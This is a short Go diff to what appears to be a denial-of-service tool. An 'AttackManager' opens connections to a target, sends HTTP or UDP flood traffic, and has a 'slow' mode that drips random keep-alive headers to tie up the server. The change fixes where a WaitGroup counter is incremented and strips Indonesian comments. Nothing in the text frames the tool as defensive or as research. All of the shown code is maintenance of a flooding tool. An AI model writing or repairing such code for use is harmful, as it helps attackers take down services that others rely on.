@@ -260,6 +260,7 @@ func (am *AttackManager) openConnection(port int, limit int) {
 		tcpConn.SetKeepAlivePeriod(30 * time.Second)
 	}
 
+	am.wg.Add(1) 
 	go func() {
 		defer wg.Done()
 		defer conn.Close()
@@ -271,8 +272,6 @@ func (am *AttackManager) openConnection(port int, limit int) {
 
 		am.atomicInc(&activeConnections)
 		am.log("New connection opened to %s. Active: %d", address, am.atomicGet(&activeConnections))
-
-		am.wg.Add(1) // Add hanya setelah melewati semua pengecekan dan siap bekerja
 
 		if am.attackType == "http" {
 			am.httpAttackGoroutine(conn, port)
@@ -362,7 +361,6 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			return
 		}
 
-		// TAMBAHKAN SETWRITEDEADLINE UNTUK OPERASI WRITE
 		if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set write deadline for %d: %v", port, err)
@@ -378,7 +376,6 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 
 		if am.mode == "slow" {
 			slowData := fmt.Sprintf("X-HaqHydra-KeepAlive: %s\r\n", generateRandomString(15))
-			// TAMBAHKAN SETWRITEDEADLINE UNTUK OPERASI WRITE SLOW
 			if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 				am.atomicInc(&errorCount)
 				am.log("Failed to set write deadline for slow data on %d: %v", port, err)
@@ -411,7 +408,6 @@ func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
 		}
 
 		payload := am.generateUDPPacket()
-		// TAMBAHKAN SETWRITEDEADLINE UNTUK OPERASI WRITE UDP
 		if err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set write deadline for UDP on %d: %v", port, err)
